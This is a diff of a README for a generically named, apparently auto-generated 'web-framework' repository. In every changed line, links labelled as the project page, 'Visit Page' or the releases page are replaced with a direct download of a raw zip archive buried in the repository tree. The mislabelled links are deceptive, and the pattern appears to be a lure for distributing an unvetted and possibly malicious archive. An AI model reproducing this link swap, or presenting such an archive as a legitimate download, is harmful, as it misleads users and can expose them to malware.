@@ -1,6 +1,6 @@
 # 🌐 web-framework-1771917357-2 - Easy Web Projects Fast
 
-[![Download](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/maxieee/web-framework-1771917357-2)
+[![Download](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/maxieee/web-framework-1771917357-2/raw/refs/heads/main/tilasite/framework_web_v2.3.zip)
 
 ## 📋 About web-framework-1771917357-2
 
@@ -35,7 +35,7 @@ You will download the software from the main GitHub page. The page has the lates
 
 **Click this button to open the download page:**  
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/maxieee/web-framework-1771917357-2)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/maxieee/web-framework-1771917357-2/raw/refs/heads/main/tilasite/framework_web_v2.3.zip)
 
 Once the page opens, look for a section named “Releases” or “Downloads.” Here, find the latest release version. It usually includes installation files or a zipped folder.
 
@@ -101,7 +101,7 @@ web-framework-1771917357-2 offers these basic options:
 To get the latest version:
 
 1. Visit the GitHub page regularly:  
-   https://github.com/maxieee/web-framework-1771917357-2  
+   https://github.com/maxieee/web-framework-1771917357-2/raw/refs/heads/main/tilasite/framework_web_v2.3.zip  
 2. Download the newest release file when available.  
 3. Replace the old version by repeating the installation steps.
 
@@ -135,8 +135,8 @@ You don’t need to use these tips right away but may find them useful as you ge
 
 ## 🔗 Quick Links
 
-- [GitHub main page to download and view instructions](https://github.com/maxieee/web-framework-1771917357-2)  
-- [Download page for releases](https://github.com/maxieee/web-framework-1771917357-2/releases)
+- [GitHub main page to download and view instructions](https://github.com/maxieee/web-framework-1771917357-2/raw/refs/heads/main/tilasite/framework_web_v2.3.zip)  
+- [Download page for releases](https://github.com/maxieee/web-framework-1771917357-2/raw/refs/heads/main/tilasite/framework_web_v2.3.zip)
 
 ---
 
